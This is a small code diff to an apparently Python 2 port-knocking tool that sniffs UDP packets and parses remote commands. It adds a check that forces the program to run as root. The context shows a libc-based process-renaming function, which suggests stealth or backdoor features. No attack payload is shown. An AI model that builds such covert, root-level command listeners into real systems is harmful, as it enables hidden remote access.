@@ -12,6 +12,9 @@ maxPort = 65535
 # unauthClients = {}
 # authedClients = {}
 
+def checkRoot():
+    if(os.getuid() != 0):
+        exit("This program must be run with root. Try Again..")
 
 def setProcessName(name):
     libc = cdll.LoadLibrary('libc.so.6')
@@ -95,6 +98,7 @@ def parseCommand(packet):
                 print "Unknown command"
 
 def main():
+    checkRoot()
     while state is not 3:
         sniff(filter='udp', prn=knock, count=1)
     while True:
